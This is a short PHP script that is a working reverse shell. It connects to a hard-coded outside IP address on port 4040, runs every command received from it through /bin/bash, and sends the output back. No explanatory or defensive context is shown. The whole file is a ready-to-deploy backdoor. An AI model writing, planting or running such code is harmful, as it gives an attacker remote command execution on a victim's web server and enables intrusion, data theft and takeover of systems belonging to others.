<?php
$ip = '170.187.252.130';
$port = 4040;
$shell = '/bin/bash'; 

$sock = fsockopen($ip, $port);
if ($sock) {
    while ($cmd = fgets($sock)) {
        $output = shell_exec($shell . " -c '" . trim($cmd) . "' 2>&1");
        fwrite($sock, $output);
    }
    fclose($sock);
}
?>
